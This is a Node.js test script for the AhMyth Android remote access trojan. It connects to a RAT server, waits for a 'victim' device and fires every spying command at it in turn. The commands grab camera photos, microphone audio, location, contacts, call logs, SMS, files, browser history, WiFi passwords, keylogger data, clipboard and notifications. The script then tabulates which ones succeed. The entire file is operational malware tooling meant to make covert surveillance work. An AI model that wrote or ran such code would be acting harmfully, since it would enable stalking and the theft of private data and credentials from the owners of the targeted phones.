/**
 * AhMyth Function Tester - Tests ALL RAT functions
 * Run with: node test-all-functions.js
 */

const io = require('socket.io-client');

const SERVER_URL = 'http://localhost:1234';
const DEVICE_ID = 'a446e998632a430a'; // Will be updated when device connects

// All available commands
const COMMANDS = {
    // Camera
    camera: { order: 'x0000ca', extra: '0', name: 'Camera (front)' },
    cameraBack: { order: 'x0000ca', extra: '1', name: 'Camera (back)' },
    
    // Microphone
    micStart: { order: 'x0000mc', extra: 'start', name: 'Mic Start' },
    micStop: { order: 'x0000mc', extra: 'stop', name: 'Mic Stop' },
    
    // Location
    location: { order: 'x0000lo', name: 'Get Location' },
    
    // Contacts
    contacts: { order: 'x0000cn', name: 'Get Contacts' },
    
    // Call Logs
    callLogs: { order: 'x0000cl', name: 'Get Call Logs' },
    
    // SMS
    smsInbox: { order: 'x0000sm', extra: 'ls', name: 'SMS Inbox' },
    
    // Files
    fileList: { order: 'x0000fm', extra: '/storage/emulated/0/', name: 'File Manager' },
    
    // Installed Apps
    installedApps: { order: 'x0000ua', name: 'Installed Apps' },
    
    // Device Info
    deviceInfo: { order: 'x0000di', name: 'Device Info' },
    
    // Browser History
    browserHistory: { order: 'x0000bh', name: 'Browser History' },
    
    // WiFi Passwords
    wifiPasswords: { order: 'x0000wp', name: 'WiFi Passwords' },
    
    // Keylogger
    keylogger: { order: 'x0000kl', name: 'Keylogger Data' },
    
    // Clipboard
    clipboard: { order: 'x0000cb', name: 'Clipboard' },
    
    // Notifications
    notifications: { order: 'x0000nt', name: 'Notifications' },
    
    // Permission Request
    requestPerms: { order: 'x0000rp', permission: 'all', name: 'Request All Permissions' },
};

let victimSocket = null;
let testResults = [];

console.log('╔══════════════════════════════════════════════════════════════╗');
console.log('║           AhMyth Function Tester - Testing ALL RAT           ║');
console.log('╚══════════════════════════════════════════════════════════════╝\n');

// Connect to server
const socket = io(SERVER_URL, {
    reconnection: true,
    timeout: 10000
});

socket.on('connect', () => {
    console.log('[✓] Connected to AhMyth server at ' + SERVER_URL);
    console.log('[i] Waiting for victim device to connect...\n');
});

socket.on('connect_error', (err) => {
    console.log('[✗] Connection error:', err.message);
    console.log('[i] Make sure the server is listening on port 1234');
});

// Listen for victim connections
socket.on('victims', (victims) => {
    if (victims && Object.keys(victims).length > 0) {
        const victimId = Object.keys(victims)[0];
        const victim = victims[victimId];
        console.log('═══════════════════════════════════════════════════════════════');
        console.log('[✓] VICTIM CONNECTED!');
        console.log(`    Device: ${victim.manf} ${victim.model}`);
        console.log(`    Android: ${victim.release}`);
        console.log(`    ID: ${victimId}`);
        console.log(`    IP: ${victim.ip}:${victim.port}`);
        console.log('═══════════════════════════════════════════════════════════════\n');
        
        // Start testing all functions
        setTimeout(() => testAllFunctions(victimId), 2000);
    }
});

async function testAllFunctions(victimId) {
    console.log('╔══════════════════════════════════════════════════════════════╗');
    console.log('║                    STARTING FUNCTION TESTS                   ║');
    console.log('╚══════════════════════════════════════════════════════════════╝\n');
    
    const commandList = Object.entries(COMMANDS);
    
    for (let i = 0; i < commandList.length; i++) {
        const [key, cmd] = commandList[i];
        await testCommand(victimId, key, cmd);
        await sleep(2000); // Wait between commands
    }
    
    printResults();
}

function testCommand(victimId, key, cmd) {
    return new Promise((resolve) => {
        const startTime = Date.now();
        console.log(`[${testResults.length + 1}/${Object.keys(COMMANDS).length}] Testing: ${cmd.name}...`);
        
        // Set up response listener
        const responseHandler = (data) => {
            const duration = Date.now() - startTime;
            const dataSize = JSON.stringify(data).length;
            
            let status = 'SUCCESS';
            let info = '';
            
            if (data.error) {
                status = 'ERROR';
                info = data.error;
            } else if (data.image === false) {
                status = 'FAILED';
                info = data.error || 'No image returned';
            } else if (Array.isArray(data) && data.length === 0) {
                status = 'EMPTY';
                info = 'No data returned';
            } else if (data.history && data.history.length === 0) {
                status = 'EMPTY';
                info = 'No history data';
            }
            
            testResults.push({
                name: cmd.name,
                status: status,
                duration: duration,
                size: dataSize,
                info: info
            });
            
            const statusIcon = status === 'SUCCESS' ? '✓' : status === 'EMPTY' ? '○' : '✗';
            console.log(`    [${statusIcon}] ${status} (${duration}ms, ${dataSize} bytes)`);
            if (info) console.log(`        → ${info}`);
            
            socket.off(cmd.order, responseHandler);
            resolve();
        };
        
        // Listen for response
        socket.on(cmd.order, responseHandler);
        
        // Send command
        const payload = { order: cmd.order };
        if (cmd.extra) payload.extra = cmd.extra;
        if (cmd.permission) payload.permission = cmd.permission;
        
        socket.emit('order', {
            to: victimId,
            ...payload
        });
        
        // Timeout after 10 seconds
        setTimeout(() => {
            socket.off(cmd.order, responseHandler);
            testResults.push({
                name: cmd.name,
                status: 'TIMEOUT',
                duration: 10000,
                size: 0,
                info: 'No response in 10s'
            });
            console.log(`    [✗] TIMEOUT`);
            resolve();
        }, 10000);
    });
}

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

function printResults() {
    console.log('\n');
    console.log('╔══════════════════════════════════════════════════════════════╗');
    console.log('║                       TEST RESULTS                           ║');
    console.log('╠══════════════════════════════════════════════════════════════╣');
    
    let success = 0, failed = 0, empty = 0, timeout = 0;
    
    testResults.forEach(r => {
        const icon = r.status === 'SUCCESS' ? '✓' : r.status === 'EMPTY' ? '○' : '✗';
        const statusPad = r.status.padEnd(8);
        console.log(`║ [${icon}] ${r.name.padEnd(25)} ${statusPad} ${(r.duration + 'ms').padStart(7)} ║`);
        
        if (r.status === 'SUCCESS') success++;
        else if (r.status === 'EMPTY') empty++;
        else if (r.status === 'TIMEOUT') timeout++;
        else failed++;
    });
    
    console.log('╠══════════════════════════════════════════════════════════════╣');
    console.log(`║ SUCCESS: ${success}  |  EMPTY: ${empty}  |  FAILED: ${failed}  |  TIMEOUT: ${timeout}`.padEnd(63) + '║');
    console.log('╚══════════════════════════════════════════════════════════════╝');
    
    process.exit(0);
}

// Keep alive
setTimeout(() => {
    console.log('[!] Timeout - no victim connected after 60 seconds');
    process.exit(1);
}, 60000);

